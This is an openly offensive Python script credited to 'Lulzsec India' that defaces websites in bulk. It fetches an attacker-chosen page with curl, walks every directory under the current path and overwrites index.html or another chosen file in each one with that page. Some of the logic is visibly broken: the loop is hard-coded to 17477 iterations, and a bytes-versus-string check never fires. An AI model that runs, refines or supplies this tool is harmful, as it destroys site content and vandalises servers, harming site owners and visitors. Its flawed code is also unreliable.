from itertools import chain
import os
from glob import glob
import subprocess


print(" .____          .__           ________          _____                              ")
print(" |    |    __ __|  | ________ \______ \   _____/ ____\____    ____  ___________    ")
print(" |    |   |  |  \  | \___   /  |    |  \_/ __ \   __\\\\__  \ _/ ___\/ __ \_  __ \ ")
print(" |    |___|  |  /  |__/    /   |    `   \  ___/|  |   / __ \\\\  \__\  ___/|  | \/ ")
print(" |_______ \____/|____/_____ \ /_______  /\___  >__|  (____  /\___  >___  >__|      ")
print("         \/                \/         \/     \/           \/     \/    \/          ")
print("                        Brought To You By : Lulzsec India                          ")
print("                                 Coded By : T3r@bYt3                               \n\n")


deface  = input("[?] Enter deface url : ")
file_name = "index.html"
print("[!] Downloading deface page")
process = subprocess.Popen(["curl", "-s" , deface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
out, error = process.communicate()
if out == "":
	print("[!] Either deface not found or url is incorrect")
	exit(1)
else:
	name = input("[?] Enter file name [default : %s]: " % file_name)
	if name != "":
		file_name = name

print("[!] Parsing deface page")
try:
	html = "<html>" + out.decode().split("<html>")[1]
except IndexError:
	print("[!] Either deface not found or url is incorrect")
	exit(1)
l = 1
print("[~] Finding all directories and subdirectories in %s" % os.getcwd())
dirs = list(chain.from_iterable(glob(os.path.join(x[0])) for x in os.walk(os.getcwd())))
td = len(dirs)
print("[!] Total directories to deface : %s" % str(td))
print("[~] Running defacer")

for x in range(17477):
	file = os.path.join(dirs[x], file_name)
	print("\t({}) {}".format(str(x+1).center(len(str(td))), file))
	try:
		with open(file, "w") as f:
			f.write(html)
			f.close()
		l+=1
	except IOError as e:
		pass

print("[!] Total files : %d"%td)
print("[!] Files added : %d"%l)
print("[!] Files not added : %d"%(td-l))
